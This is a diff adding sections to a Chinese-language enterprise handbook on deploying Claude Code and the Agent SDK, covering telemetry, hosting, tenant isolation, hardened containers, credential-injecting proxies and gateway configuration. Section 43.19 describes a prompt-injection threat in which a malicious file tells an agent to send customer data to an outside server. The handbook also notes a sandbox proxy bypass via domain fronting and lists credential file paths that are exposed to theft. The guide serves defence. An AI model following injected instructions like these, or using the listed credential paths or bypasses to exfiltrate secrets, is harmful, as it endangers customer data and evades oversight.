+> 🎯 **多使用者服務的歸因**：CLI 附加的身分屬性是**服務本身的憑證**，不是終端使用者。請在每次呼叫 `query()` 時，以 `OTEL_RESOURCE_ATTRIBUTES` 注入 `enduser.id`、`tenant.id` 等屬性（**值要先做 percent-encode**）。這樣 `tool_decision`、`tool_result`、`mcp_server_connection`、`permission_mode_changed` 事件就會成為**以使用者為單位的稽核軌跡**，可以直接送進 SIEM。
+>
+> 🚨 內容類遙測（`OTEL_LOG_USER_PROMPTS`、`OTEL_LOG_TOOL_DETAILS`、`OTEL_LOG_TOOL_CONTENT`、`OTEL_LOG_RAW_API_BODIES`）預設全部關閉。**只有在可觀測性平台已獲准儲存這類資料時才開啟**；開啟 `OTEL_LOG_RAW_API_BODIES` 等同同意揭露完整對話。
+
+**成本**：
+
+- 🚨 `total_cost_usd` 與 `costUSD` 是**用戶端的估算值**，依建置時內附的價目表（或 `modelPricing`）計算，可能因價格變動、SDK 不認得新模型等原因偏離實際帳單。**不得用來向終端使用者收費，也不得用來觸發財務決策**；權威數字請用 Usage and Cost API 或 Console。
+- 資料駐留：回應的 `usage` 回報 `inference_geo: "us"` 時，SDK 會把該回應 token 的牌價乘以 **1.1**。
+- 同一回合的多個工具呼叫共用同一個訊息 ID，**要依 ID 去重**，才不會重複計算。
+- Prompt cache TTL：以 API key 或第三方 Provider 認證時，主對話預設 **5 分鐘**。大量短 session 共用同一個 system prompt 時，可設 `ENABLE_PROMPT_CACHING_1H`（1 小時的寫入單價較高），或用 `CLAUDE_CODE_PROMPT_CACHE_TTL`／`CLAUDE_CODE_SUBAGENT_PROMPT_CACHE_TTL` 分開控制。
+- 官方觀察：**token 成本通常比容器基礎設施成本高出一個數量級以上**。最小規格的容器約每小時 $0.05，而單一長 session 就可能花掉數美元的 token。
+
+### 43.18 Hosting：部署模式、資源與多租戶【Official】（v1.2 新增）
+
+#### 43.18.1 四種 session 模式【Official】
+
+| 模式 | 說明 | 典型工作 | 關鍵要求 |
+| --- | --- | --- | --- |
+| **Ephemeral** | 每個任務一個容器，完成即銷毀 | 修 bug、單據擷取、文件翻譯 | 次秒級冷啟動 |
+| **Long-running** | 常駐容器，每個容器承載多個 SDK 子行程 | email 分流、Slack bot | 以 `sessionId` 做 consistent hashing，把 session 綁在固定容器上 |
+| **Hybrid** | 臨時容器，啟動時從 `SessionStore` 還原，閒置時縮容 | 間歇互動的專案助理、深度研究 | **一定要有 `SessionStore`** |
+| **Multi-agent container** | 一個容器內有多個互相協作的 SDK 子行程 | 多 agent 模擬 | 每個 agent 使用獨立的工作目錄，並隔離設定載入 |
+
+#### 43.18.2 資源與擴展【Official】
+
+- 起始配置：每個 agent **1 GiB RAM、5 GiB 磁碟、1 CPU**。這是**下限而不是上限**，記憶體會隨 session 長度與工具活動成長。
+- 容量公式：`每台主機的 agent 數 = (主機 RAM − 系統開銷) ÷ 單一 session 的 RAM 峰值`。峰值請用具代表性的 session 跑到目標長度，並記錄 RSS。
+- 網路：出站需要 `api.anthropic.com`（或 Bedrock／Vertex 的區域端點）與 MCP 端點；正式環境請一律走**出口 proxy**。入站只需要應用程式的 HTTP／WebSocket port，**子行程本身不監聽網路**。
+- 認證：`ANTHROPIC_API_KEY` 由 secret manager 提供，或以 `ANTHROPIC_BASE_URL` 經 proxy 注入。**終端使用者的認證放在 agent 前方的 gateway**，agent 不應該負責驗證使用者 token。
+
+#### 43.18.3 已知限制【Official】
+
+| 限制 | 對策 |
+| --- | --- |
+| 沒有頂層 session 逾時 | 設定 `maxTurns` |
+| 長 session 的記憶體會持續成長 | 限制 session 長度，或定期回收子行程 |
+| 大量平行 subagent 可能撞到速率限制 | 分批派送 |
+| 沒有單一 subagent 的總時限 | 在 `AgentDefinition` 設定 `maxTurns` |
+
+#### 43.18.4 多租戶隔離的五項措施【Official】
+
+1. `settingSources: []`（Python：`setting_sources=[]`），略過 user／project／local 設定。
+2. 在 `env` 中設 `CLAUDE_CODE_DISABLE_AUTO_MEMORY=1`（auto memory 不受 `settingSources` 控制）。
+3. 把 `CLAUDE_CONFIG_DIR` 指向**每個租戶專屬**的目錄，避免共用 `~/.claude.json`；可以再搭配 `CLAUDE_CODE_PROJECT_DIR_NAME` 縮短 transcript 路徑（TS SDK v0.3.234+／Python v0.2.140+）。
+4. 每次呼叫 `query()` 都**明確傳入租戶專屬的 `cwd`**。
+5. 在 proxy 上套用**每個租戶自己的出口規則**（不同的出口 IP、憑證、網域允許清單），避免被入侵的租戶借用其他租戶的出口政策外洩資料。
+
+> 🚨 **以組織憑證認證時，server-managed settings 一定會被抓取，檔案系統隔離無法移除它。** 多租戶服務若使用組織憑證，所有租戶都會套用同一份組織政策，請把這一點納入設計。
+
+### 43.19 安全部署：隔離技術、Proxy Pattern 與檔案系統【Official】（v1.2 新增）
+
+官方的威脅模型：agent 可能因為 **prompt injection**（處理的內容中夾帶了指示）或**模型錯誤**而採取非預期的動作。模型本身有抵抗能力，但**縱深防禦仍然必要**。例如，惡意檔案指示 agent 把客戶資料送到外部伺服器時，網路管控可以直接擋下這個請求。
+
+#### 43.19.1 隔離技術比較【Official】
+
+| 技術 | 隔離強度 | 效能開銷 | 複雜度 | 注意事項 |
+| --- | --- | --- | --- | --- |
+| **Sandbox runtime**（`@anthropic-ai/sandbox-runtime`） | 良好（預設值安全） | 極低 | 低 | 共用主機 kernel；proxy **不做 TLS 檢查**，可能被 domain fronting 繞過 |
+| **容器（Docker）** | 取決於設定 | 低 | 中 | 共用主機 kernel |
+| **gVisor** | 優異（設定正確時） | 中／高 | 中 | 檔案 I/O 密集的工作最多會慢 10–200 倍 |
+| **VM（Firecracker、QEMU）** | 優異（設定正確時） | 高 | 中／高 | Firecracker 開機 < 125 ms、記憶體開銷 < 5 MiB |
+
+官方的強化容器設定，逐項說明如下：
+
+| 選項 | 目的 |
+| --- | --- |
+| `--cap-drop ALL` | 移除 `NET_ADMIN`、`SYS_ADMIN` 等可用來提權的 capability |
+| `--security-opt no-new-privileges` | 防止經由 setuid binary 提權 |
+| `--security-opt seccomp=...` | 限制可用的 syscall |
+| `--read-only` 加上 `--tmpfs /tmp:rw,noexec,nosuid,size=100m` | 根檔案系統唯讀，只提供記憶體中的暫存目錄 |
+| `--network none` 加上掛載的 Unix socket | **沒有任何網路介面**，只能透過 socket 連到主機上的 proxy |
+| `--memory 2g`、`--pids-limit 100` | 防止資源耗盡與 fork bomb |
+| `--user 1000:1000` | 以非 root 身分執行 |
+| `-v <code>:/workspace:ro` | 程式碼唯讀掛載；🚨 **不要掛載 `~/.ssh`、`~/.aws`、`~/.config`** |
+
+雲端部署的做法：私有子網路不設 internet gateway → 防火牆只允許連到 proxy → proxy（例如 Envoy 的 `credential_injector`）驗證請求、執行網域允許清單並注入憑證 → service account 只給最小 IAM 權限 → 在 proxy 上記錄所有流量以供稽核。
+
+#### 43.19.2 Proxy Pattern：agent 永遠看不到憑證【Official】
+
+| 方法 | 適用範圍 | 限制 |
+| --- | --- | --- |
+| `ANTHROPIC_BASE_URL` | **只有模型請求**；proxy 收到的是明文 HTTP，可以注入憑證 | 不涵蓋 GitHub、npm 等其他服務 |
+| `HTTP_PROXY`／`HTTPS_PROXY` | 所有 HTTP 流量 | HTTPS 只是 CONNECT 通道，**不做 TLS 終止就看不到、也改不了內容** |
+| 自訂工具／MCP server | 其他服務（git、資料庫、內部 API） | 需要開發工具；優點是**不需要 TLS 攔截** |
+| TLS 終止 proxy | 任意 HTTPS 服務 | 需要把 proxy 的 CA 裝進 agent 的信任存放區 |
+
+> ⚠️ 不是所有程式都遵守 `HTTP_PROXY`。例如 Node.js 的 `fetch()` 預設會忽略它（Node 24+ 可設 `NODE_USE_ENV_PROXY=1`）。要完整涵蓋，請用 proxychains，或用 iptables 導向透明 proxy。
+
+#### 43.19.3 唯讀掛載前必須排除的檔案【Official】
+
+即使是唯讀掛載，程式碼目錄中的憑證仍然會外洩：`.env`、`.env.local`、`~/.git-credentials`、`~/.aws/credentials`、`~/.config/gcloud/application_default_credentials.json`、`~/.azure/`、`~/.docker/config.json`、`~/.kube/config`、`.npmrc`、`.pypirc`、`*-service-account.json`、`*.pem`、`*.key`。建議只複製需要的原始碼，或用類似 `.dockerignore` 的方式過濾。
+
+### 43.20 版本遷移、已移除的 API 與企業參考架構（v1.2 新增）
+
+#### 43.20.1 遷移與已移除的 API【Official】
+
+| 變更 | 內容 | 影響 |
+| --- | --- | --- |
+| 改名 | `@anthropic-ai/claude-code` → `@anthropic-ai/claude-agent-sdk`；`claude-code-sdk` → `claude-agent-sdk`；Python 的 `ClaudeCodeOptions` → `ClaudeAgentOptions` | 舊套件名稱必須全面替換 |
+| System prompt 不再是預設 | v0.1.0 起預設使用最小 prompt（見 43.12） | 🚨 從舊 SDK 遷移的服務**會靜默失去 Claude Code 的安全指示** |
+| `settingSources` 的預設值 | v0.1.0 曾短暫改為「不載入」，之後已還原為載入 user／project／local | 需要隔離時必須明確傳入 `[]` |
+| **TypeScript V2 session API 已移除** | TS SDK **0.3.142** 移除了 `unstable_v2_createSession`、`unstable_v2_resumeSession`、`unstable_v2_prompt` 與 `SDKSession` 型別 | 改用 `query()`，搭配 `AsyncIterable<SDKUserMessage>` 或 `options.resume` |
+| 認證 | 除非事先獲得核准，**第三方產品不得提供 claude.ai 登入或其速率限制**，一律使用 API key | 見第 [8.7.4 節](#874-法遵與授權邊界officialv11-新增) |
+
+SDK 版 file checkpointing 的限制：只追蹤 Write／Edit／NotebookEdit，**Bash 造成的變更不追蹤**；subagent 的編輯不追蹤（前景執行的 `context: fork` skill 除外）；目錄的建立、移動與刪除不會被還原；也不追蹤遠端或網路上的檔案。**真正的還原機制請用 git**。
+
+#### 43.20.2 企業 Agent 平台參考架構【建議】
+
+```mermaid
+flowchart LR
+    subgraph EDGE["入口層"]
+        GW["API Gateway<br/>SSO / 使用者認證 / 配額"]
+    end
+    subgraph APP["應用層（可水平擴展）"]
+        SVC["Agent 服務<br/>query() + canUseTool<br/>maxTurns / maxBudgetUsd"]
+        HOOK["程式化 Hooks<br/>PreToolUse 稽核與阻擋"]
+    end
+    subgraph RUN["執行層（每個租戶隔離）"]
+        C1["容器 / gVisor<br/>--network none<br/>CLAUDE_CONFIG_DIR=/tenants/A"]
+    end
+    subgraph EGRESS["出口層"]
+        PX["Egress Proxy<br/>網域允許清單 / 憑證注入 / 全量記錄"]
+    end
+    subgraph DATA["資料層"]
+        SS["SessionStore<br/>物件儲存 + 生命週期規則"]
+        OT["OTel Collector → SIEM<br/>enduser.id / tenant.id"]
+    end
+    GW --> SVC --> HOOK --> C1
+    C1 -- "Unix socket" --> PX
+    PX --> API["Anthropic API / Bedrock / Vertex"]
+    PX --> INT["內部 API / Git / 套件庫"]
+    SVC --> SS
+    C1 --> OT
+```
+
+| 層 | 必要控制 | 對應章節 |
+| --- | --- | --- |
+| 入口 | 使用者認證、授權（誰能在哪些 repo 做什麼）、配額 | 43.18.2 |
+| 應用 | `maxTurns`、`maxBudgetUsd`、`dontAsk` 或 `canUseTool`、`PreToolUse` hook | 43.10、43.11 |
+| 執行 | 每租戶隔離（五項措施）、強化容器、非 root | 43.18.4、43.19.1 |
+| 出口 | 由 proxy 注入憑證、網域允許清單、每租戶的出口政策 | 43.19.2 |
+| 資料 | `SessionStore` 保留期、`mirror_error` 告警、以使用者歸因的遙測 | 43.14、43.17 |
+
+> 🎯 **上線前檢核（Agent SDK 版）**
+>
+> - [ ] 明確設定了 `systemPrompt`
+> - [ ] `settingSources: []`，並停用 auto memory
+> - [ ] 設定了 `maxTurns` 與 `maxBudgetUsd`
+> - [ ] 不使用 bypass，或只在隔離環境中使用
+> - [ ] 所有必要的檢查都寫成 `PreToolUse` hook，而不是只寫在 `canUseTool`
+> - [ ] 憑證只存在於 proxy
+> - [ ] `SessionStore` 已設定保留期
+> - [ ] 遙測已注入 `enduser.id`
+> - [ ] SDK 套件版本符合 `requiredMinimumVersion`
+> - [ ] 產品命名符合品牌規範
+
+### 43.21 本章實務案例
 
 **案例：一個內部的「Legacy 問答服務」**
 
@@ -14861,7 +16544,7 @@ def ask_legacy(question: str, repo_path: str) -> dict:
 
 🎯 **關鍵洞察：階段 5 值得投入的前提是「階段 1–4 已經證明了價值，只是取用門檻太高」。** 不要一開始就建平台。
 
-### 43.9 本章注意事項
+### 43.22 本章注意事項
 
 > 🚨 **Agent SDK 不處理認證與授權。** 這是你的責任，而且是最容易出錯的地方。
 >
@@ -16998,7 +18681,7 @@ flowchart TD
 
 ```json
 {
-  "requiredMinimumVersion": "2.1.228"
+  "requiredMinimumVersion": "2.1.281"
 }
 ```
 
@@ -17241,7 +18924,56 @@ Champion Kit 對五種常見抗拒給了回應框架。官方的原則是：**�
 
 > 🚨 **一個必須明訂的邊界**：當有人問「資安與資料處理怎麼辦？」時，官方明確要求 **champion 應轉交給管理員，不得自行即興回答**——貴司的部署與資料處理政策已經設定好了。**請把這一條寫進貴司的 champion 規範**，見第 [8 章](#8-enterprise-governance企業治理) 與第 [26 章](#26-secrets-與敏感資料治理)。
 
-### 50.7 本章實務案例
+### 50.7 業界導入經驗與研究（v1.2 新增）【Community】
+
+> 📌 本節整理官方文件以外的公開研究與社群實務，**標為【Community】**：可以作為規劃參考，但不是 Anthropic 的官方立場。數字請以原始來源為準。
+
+#### 50.7.1 第一份大規模學術研究：Microsoft Research（2026-07）【Community】
+
+Microsoft 的 Murphy-Hill、Butler 與 Savelieva 於 2026-07-01 在 arXiv 發表論文（2607.01418），以 2026 年 1 至 4 月、Microsoft 內部**數萬名工程師**導入 Claude Code 的遙測資料分析採用、留存與產出：
+
+| 發現 | 對導入規劃的意義 |
+| --- | --- |
+| 採用者合併的 PR 數量**約多 24%**，而且在不同子族群與觀察期間都成立 | 生產力提升是真的，可以作為投資評估的參考量級 |
+| 🚨 **這是母體平均值**：採用前就 coding 活躍的工程師留存率與效益明顯較高，活躍度較低的族群效益較小 | **不要用平均值估算每個人的 ROI**；席位分配與預算應依實際使用強度調整 |
+| **首次使用主要透過同儕網絡擴散，而不是由上而下的命令** | 印證第 [50.6 節](#506-官方-adoption-kitcommunications-kit-與-champion-kitofficialv11-新增) 的 champion 制度比行政命令更有效 |
+| 留存與採用前的 coding 活躍度強烈相關，與人口統計特徵無關 | 試點對象應優先選擇**高頻率寫程式**的工程師 |
+
+> ⚠️ **成本提醒**：相關報導指出，以用量計價在組織規模下可能達到**每年數百萬美元**等級。本手冊無法獨立查證個別企業的花費數字，但這個量級與第 [5.6 節](#56-成本模型與實測區間official) 的官方平均值（每人每月約 $150–250）乘上數萬人的結果一致。**導入前就要建立路由層與預算治理**（第 [53 章](#53-企業-gateway-架構llm-gateway-與-claude-apps-gateway) 的 spend limits、第 [41.6 節](#416-v12-補齊的遙測訊號與政策驗證officialv12-新增) 的遙測），而不是等帳單出現才補。
+
+#### 50.7.2 社群常見的分階段導入閘門【Community】
+
+多份公開的導入手冊（playbook）採用類似的四階段、4–8 週節奏，並以**可量化的閘門**決定是否擴大：
+
+| 階段 | 規模 | 期間 | 擴大前的閘門（範例） |
+| --- | --- | --- | --- |
+| 試點 | 3–5 人（資深、中階、資淺各一，做**真實專案**） | 第 1–2 週 | 80% 的人每週至少 3 個 session |
+| 部門 | 10–20 人 | 第 3–4 週 | 70% 每週活躍 |
+| 跨部門 | 30–60 人 | 第 5–6 週 | 60% 每週活躍、滿意度 7/10 |
+| 全組織 | 50–200+ 人 | 第 7 週起 | 連續 4 週維持 55% 活躍 |
+
+與本手冊第 [50.4 節](#504-導入-roadmap七階段建議) 七階段 Roadmap 的關係：上表是**擴散速度**的參考，第 50.4 節則是**治理成熟度**的參考，兩者可以並用。
+
+#### 50.7.3 社群歸納的五個失敗模式【Community】
+
+| 失敗模式 | 本手冊的對應做法 |
+| --- | --- |
+| **權限過度限制，扼殺採用** | 以 auto mode 或 `acceptEdits` 搭配 `ask` 規則當作起點，而不是全面 Manual（第 [2.2.4 節](#224-企業該怎麼做建議)） |
+| **跳過教育訓練** | 附錄 [G](#附錄-g新進成員最終-checklist) 的 onboarding checklist、第 [50.6 節](#506-官方-adoption-kitcommunications-kit-與-champion-kitofficialv11-新增) 的 champion 制度 |
+| **忽略試點回饋** | 把被拒絕的動作與使用摩擦列為試點的正式指標（遙測中的 `tool_decision`、`permission_mode_changed`） |
+| **沒有 CLAUDE.md 標準，行為各自為政** | 第 [14.6 節](#146-企業標準-claudemd-範本建議) 的企業標準 CLAUDE.md、第 [46 章](#46-企業-repository-標準結構與共用平台) 的 repo 標準結構 |
+| **把導入當成一次性專案** | 第 [50.2 節](#502-各項的維運節奏建議) 的維運節奏、附錄 [F.5](#f5-覆核建議節奏) 的覆核節奏、附錄 [H](#附錄-h2026-功能演進時間軸whats-new-w13w37) 的時間軸 |
+
+> 🎯 **社群最常引用的一句話**：「導入 Claude Code **不是技術部署，而是一場行為改變計畫**。」另一個常見的比喻是「**模型只做四成的工作，harness 做六成**」：沒有分層的 CLAUDE.md、確定性的 hooks、聚焦的 skills、集中管理的 plugins 與可運作的 LSP，只發帳號的組織通常只會得到平庸的結果。這與本手冊附錄 [A](#附錄-aai-agent-十大工程原則) 的十大原則一致。
+
+**參考來源**（【Community】）：
+
+- Murphy-Hill, Butler, Savelieva, arXiv 2607.01418（2026-07-01），由 TheRouter.ai 報導整理
+- systemprompt.io，*Claude Code Enterprise Rollout Playbook for 50+ Developers*
+- Pasquale Pillitteri，*Claude Code in Enterprise Codebases: Anthropic's Guide to Scaling AI Coding*
+- General Analysis，*Claude Code Enterprise Security Deployment*
+
+### 50.8 本章實務案例
 
 **案例：一份導入六個月的成效報告**
 
@@ -17287,7 +19019,7 @@ Champion Kit 對五種常見抗拒給了回應框架。官方的原則是：**�
 
 🎯 **關鍵洞察：這份報告之所以有說服力，是因為它同時報告了「速度」與「品質」，並且明確標示了「哪些指標必須不能變差」。**
 
-### 50.8 本章注意事項
+### 50.9 本章注意事項
 
 > 🚨 **絕對不要用「程式碼產生量」或「AI 寫了幾 %」當 KPI。**
 >
@@ -18216,9 +19948,9 @@ Enterprise AI Software Engineering
 
 ---
 
-# 補充章節（v1.1 新增）
+# 補充章節（v1.1 新增，v1.2 擴充）
 
-以下兩章補上 v1.0 附錄 F.3 自承未逐頁覆核的兩個區塊：**Gateway 系列 10 頁**（F.3 #6）與 **Provider 專頁 4 頁**（F.3 #5）。兩者都屬於**第二部（授權、部署與企業治理）**的主題，但為了讓 v1.0 既有的第 1–52 章章號與所有交叉連結**完全不受影響**，實體位置放在第 52 章之後。
+以下四章補上前版附錄 F.3 自承未逐頁覆核的區塊：第 53 章 **Gateway 系列 10 頁**（F.3 #6）、第 54 章 **Provider 專頁 5 頁**（F.3 #5）、第 55 章 **Self-hosted Environments 7 頁**（F.3 #13，v1.2 新增）、第 56 章 **Interface 系列 6 頁**（F.3 #11，v1.2 新增）。前三章屬於**第二部（授權、部署與企業治理）**的主題，第 56 章屬於**第三部（安裝與基本操作）**；為了讓 v1.0 既有的第 1–52 章章號與所有交叉連結**完全不受影響**，實體位置放在第 52 章之後。
 
 ---
 
@@ -18329,7 +20061,305 @@ Gateway 是**貴組織自行運行、位於 Claude Code 與模型供應商之間
 | **用戶端遙測** | Session 登入 Claude apps gateway 時，Claude Code 會**關閉其送往 Anthropic 的用戶端分析**。但**登入前的啟動分析**需另以 client-side managed settings 交付 `DISABLE_TELEMETRY` 才會關閉 |
 | **企業 HTTP proxy** | 需在 gateway **之外另行設定**（見 [53.5.3](#5353-proxy-與-gateway-並存時的陷阱official)） |
 
-### 53.8 本章注意事項
+### 53.8 Claude Apps Gateway 部署實務：定位與開發者連線【Official】（v1.2 新增）
+
+> 📌 **v1.2 覆核範圍**：第 53.8 至 53.14 節依官方 `claude-apps-gateway`、`-config`、`-spend-limits`、`-deploy`、`-on-aws`、`-on-gcp`，以及 `llm-gateway`、`-connect`、`-rollout`、`-protocol` 共 10 頁逐頁覆核，補齊 v1.1 第 53.8 節第五點自承「未展開」的部署細節。
+
+#### 53.8.1 何時選它、何時不選【Official】
+
+官方把 Claude Apps Gateway 定位為：**必須（或偏好）讓推論流量走自家雲端 Provider 的組織**，例如有資料駐留要求。若沒有這個要求，而且需要 SCIM 佈建、Claude Code on the web、行動裝置等功能，官方直接建議 **Claude Enterprise 可能更合適**。
+
+它內建在 `claude` binary 中，以 `claude gateway --config gateway.yaml` 啟動。部署後可以得到：
+
+| 能力 | 說明 |
+| --- | --- |
+| **憑證** | 上游 API key 或雲端憑證只存在你的基礎設施中；開發者以企業 SSO 登入，取得**短效 bearer token**（預設 1 小時），**離職處理在 IdP 完成** |
+| **存取控制** | IdP 群組對應模型允許清單與 managed settings 政策；**模型存取在伺服器端強制**，未授權的模型直接被拒 |
+| **設定交付** | 由 gateway 直接交付 managed settings，**取代** claude.ai 管理後台的 server-managed settings |
+| **遙測** | 每個目的地預設收到 OTLP metrics（token 數、模型、使用者身分、延遲）；logs 與 traces 需逐一目的地開啟 |
+| **上游路由** | 用戶端一律說 Anthropic Messages API，由 gateway 轉譯成各上游格式並支援 failover；**換區域或換 Provider 時開發者無感** |
+
+> 🎯 **資料流關鍵事實**：gateway 自身的資料平面**除非 Anthropic API 被設為上游，否則不會傳送任何東西到 Anthropic**。遙測、稽核記錄、managed settings、開發者的 IdP 身分，全部只送到你設定的目的地。
+
+#### 53.8.2 🚨 只能部署在私有網路上【Official】
+
+Claude Code **只會連線到位址為私有 IP 的 gateway**。這是刻意的安全設計：**受信任的 gateway 可以推送「會在開發者機器上執行指令」的設定**，其控制力等同 MDM。
+
+- 請把 gateway 放在內部負載平衡器或 VPN 後方，主機名稱只解析到私有 IP。
+- 若內部網路使用組織自有的**公有 IPv4 位址段**，可以在 managed settings 列出 `gatewayInternalNetworks`（v2.1.268+）。規則如下：最多 4 個區段、不可重疊、不可與私有位址段或文件保留段重疊，而且**只能寫在 managed settings 檔、MDM 或登錄檔**（使用者、專案與 server-managed settings 中會被忽略）。
+- 通過檢查的條件：gateway 的每個解析位址都在同一區段內、**開發者機器也從該區段連線**（NAT、容器、WSL2、位址池在區段外的 VPN 都會被拒），而且是直連（`HTTPS_PROXY` 生效時會被拒，並提示該加入的 `NO_PROXY` 項目）。
+- ⚠️ 設定值有任何錯誤時，Claude Code 會**拒絕該機器上所有新的 gateway 登入**（已登入的 session 不受影響）。請先在單一機器上測試再佈署。
+
+#### 53.8.3 開發者連線：以 managed settings 推送，開發者零設定【Official】
+
+```json
+{
+  "forceLoginMethod": "gateway",
+  "forceLoginGatewayUrl": "https://claude-gateway.internal.example.com",
+  "parentSettingsBehavior": "merge"
+}
+```
+
+| 機制 | 說明 |
+| --- | --- |
+| **TLS 憑證指紋釘選** | CLI 第一次連線時會記錄 gateway 葉憑證的 SHA-256 指紋，並在登入、靜默更新與 managed settings 抓取時重新檢查。🚨 **經 HTTPS proxy 的請求會略過釘選檢查**，所以 gateway 主機一定要加入 `NO_PROXY` |
+| **憑證輪替** | 每位開發者都會再看到一次信任提示；若政策含需要核准的設定，核准對話框也會再出現一次。**請把憑證輪替當成計畫性事件**，並公告新的指紋 |
+| **開發者無法自行設定** | 登入選單沒有 gateway 選項；開發者自己設定檔中的 `forceLoginGatewayUrl` 會被忽略 |
+| **帳號確認**（v2.1.275+） | gateway 在 token 回應中帶 `email` 時，開發者要先確認帳號才會儲存憑證（`claude gateway` 內建伺服器不回傳此欄位） |
+| **登出撤銷**（v2.1.275+） | 若 gateway 公布了 `revocation_endpoint`，`/logout` 會嘗試撤銷 token。🚨 **內建 gateway 不提供此端點**，要在伺服器端強制登出只能輪替 JWT secret（見 53.11） |
+
+對開發者的強制保證：
+
+- 未授權的模型請求回傳 `400`，`/model` 清單只顯示允許清單內的模型（建議同時設 `enforceAvailableModels: true`）。
+- OTLP 匯出**改送到 gateway**，而不是開發者本機設定的端點（除非政策指定直送 collector）。
+- 登入期間 gateway token 是**唯一憑證**，既有的 claude.ai 登入會被忽略。
+- 🚨 **Fail-closed**：已登入的 session 在啟動時連不到 gateway，約 10 秒後會**直接結束**，而不是在沒有政策的情況下啟動。
+- IdP 停用使用者之後，該 session 會在 `ttl_hours` 內因為更新失敗而失效。
+
+#### 53.8.4 Claude Desktop 與 parent settings 的治理陷阱【Official】
+
+Claude Desktop 的 Cowork、Code（以及啟用時的 Chat）分頁，會以內嵌的 Claude Code session 經由 gateway 送出請求。**內嵌 session 不會自己抓取 gateway 政策**，而是由 Desktop 以 **parent settings** 傳入。
+
+> 🚨 **只安裝 Claude Desktop 的機器，必須在 managed settings 設 `parentSettingsBehavior: "merge"`**。否則出口允許清單（`WebFetch` 網域規則與沙箱網路規則）**不會生效，而且沒有任何警告**；gateway 仍會拒絕未授權的模型，但網路限制會失效。
+>
+> 反過來說，一旦開啟 merge，**任何啟動 Claude Code 的宿主程序**（Desktop、Agent SDK 應用、IDE 擴充）都能傳入 parent settings。請同時部署五個 `allowManaged*Only` 鎖定鍵與其允許清單，讓 parent settings 盡量只能「限制」、不能「放寬」。即使五個鎖都設了，**`forceLoginOrgUUID`、`allowedMcpServers`、`availableModels`、`strictPluginOnlyCustomization` 仍可能由宿主傳入**，請在最高優先權的管理來源中自行設定這些值。
+
+CI 的限制（沿用 53.6）：**沒有 service-token 流程**，登入一律是瀏覽器 device flow。例外是：開發者已登入的機器上，`claude -p` 與 Agent SDK session 會共用該 gateway session 並受其政策約束；也可以在沒有螢幕的遠端主機上，以 SSH 執行 `/login`，再到筆電的瀏覽器上完成驗證。
+
+#### 53.8.5 經 gateway 時的功能可用性【Official】
+
+| 功能 | 狀態 | 說明 |
+| --- | --- | --- |
+| 推論轉發（Bedrock、Claude Platform on AWS、Agent Platform、Foundry、Anthropic） | ✅ | 含各上游的模型轉譯與 failover；**Bedrock 的 Mantle 端點不是支援的上游** |
+| 依 IdP 群組的模型存取與 managed settings | ✅ | 模型存取在伺服器端強制 |
+| Claude Desktop | ✅（需 opt-in） | 政策需帶 `desktop` 鍵 |
+| 每人／每群組花費上限 | ✅ | 見 53.10 |
+| 一般 prompt caching | ✅ | |
+| Auto mode | ✅ | 依第三方 Provider 規則 |
+| **Server-side web search** | ❌ | CLI 無法確認上游是否支援，所以**停用 WebSearch** |
+| **Remote Control** | ❌ | |
+| **1 小時 cache TTL** | ❌ | 一律 5 分鐘（並非所有上游都支援） |
+| 需要 feature flag 的功能（如 `/import`） | ❌ | |
+| `/design-sync`、`/design-login` | ❌ | 需要 claude.ai |
+| OTLP/gRPC | ❌ | 只支援 OTLP over HTTP |
+| SAML、LDAP 等非 OIDC 認證 | ❌ | 只支援 OIDC；需要時請前置 OIDC bridge |
+| 多個 OIDC issuer | ❌ | 每個 gateway 一個 issuer，需要時跑多個實例 |
+| Windows server | ❌ | 只能部署在 Linux（macOS 僅供本機開發） |
+| Helm chart、Admin UI | ❌ | 以標準的無狀態 Deployment 部署；設定就是 YAML，修改後需重新部署 |
+
+### 53.9 `gateway.yaml` 設定重點【Official】（v1.2 新增）
+
+| 區段 | 必填 | 企業重點 |
+| --- | --- | --- |
+| `listen` | ✅ | `public_url`（非 loopback 時必填，用於 IdP redirect）；**前方有 LB 時必設 `trusted_proxies`**，否則所有人都會被視為來自 LB 的 IP，共用同一個速率限制 |
+| `oidc` | ✅ | `issuer`、`client_id`／`client_secret`；`allowed_email_domains`、`allowed_groups` 做縱深防禦；`groups_claim`（Entra 可能是 `roles`）；`ca_cert_pem`（私有 PKI）；`use_pkce` 預設開啟 |
+| `session` | ✅ | `jwt_secret` 至少 32 bytes 熵，**可用陣列輪替**；`ttl_hours` 預設 `1` |
+| `store` | ✅ | `postgres_url`（device grant 需要跨 replica 狀態，所以**一定要 Postgres**）；密碼請放在 `password`，不要寫進 URL；`connect_timeout_seconds`（v2.1.274+） |
+| `upstreams` | ✅ | **有序清單**，依序嘗試；見下方 failover 規則 |
+| `managed` | — | 依 IdP 群組或 email 網域的政策，見 53.9.2 |
+| `telemetry` | — | `forward_to` 目的地（必須是 `https://`）；每個目的地各自選擇 metrics／logs／traces |
+| `admin`／`enforcement`／`pricing`／`models` | — | 花費上限、計價與模型對應，見 53.10 |
+| `access_control`／`limits`／`timeouts`／`rate_limits` | — | 🚨 **`allow_cidrs` 非空時為預設拒絕**；空的時候 gateway 會警告（v2.1.268+）。`/healthz` 與 `/readyz` 不受此限制 |
+
+秘密值的展開：`${VAR}`（環境變數，未定義時啟動失敗）與 `${file:/path}`（檔案內容，必須是整個欄位的值）。
+
+#### 53.9.1 上游與 failover【Official】
+
+- `5xx`、`429`、`401`、`403`、`404`、逾時與 `501` 會 failover 到下一個上游；**其他 `4xx` 不會**（視為請求本身的問題）。
+- **gateway 不記錄上游的失敗狀態**：上游當機期間，每個請求都會先嘗試它、等它失敗才換下一個。非 Anthropic 上游最長會等 **1 小時**才開始回應，所以 Anthropic 上游請設 `timeouts.upstream_ttfb_ms`。
+- 典型的多上游設計：**Bedrock provisioned throughput → Bedrock on-demand → 第二個 AWS 帳號 → Anthropic API**。
+- ⚠️ **跨 Provider failover 會改變適用的合約、地理位置與條款**。有資料駐留要求時，**不要**把 Anthropic API 列為備援。
+- Bedrock 的 IAM 權限：`bedrock:InvokeModel`、`bedrock:InvokeModelWithResponseStream`（inference profile 與 foundation model 的 ARN 都要授權），以及 `bedrock:CountTokens`；正式環境請用 IRSA 或 ECS task role，不要在映像檔中放靜態金鑰。
+- 雲端上游的錯誤訊息可能包含帳號 ID 與 role ARN。gateway 只把完整訊息寫在營運日誌中，回給開發者的是 `capability_rejected:` 代碼或通用訊息（v2.1.233+）。
+- `headers:`（v2.1.277+）：對單一上游加上靜態標頭，讓你自己的 proxy 路由或歸因；保留名稱（`authorization`、`x-api-key`、`anthropic-*`、`x-amz-*` 等）會導致啟動失敗。
